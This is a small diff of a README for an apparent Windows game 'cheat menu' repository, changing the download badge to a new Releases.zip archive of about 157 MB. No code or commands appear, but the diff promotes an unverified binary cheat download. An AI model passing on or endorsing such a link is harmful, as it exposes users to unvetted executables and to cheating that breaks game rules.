@@ -11,7 +11,7 @@
 [![License](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/knobbyspeak/wardogs-cheat-menu/blob/main/License)
 [![Windows](https://img.shields.io/badge/Windows-10%2F11-blue.svg)]()
 
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/download/Update/Releases.zip)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/wardogs-cheat-menu/releases/download/Update2/Releases.zip)
 
 **Release:** `v0.7.5+` · **Package size:** approximately `157 MB` (Update 09-16)
 
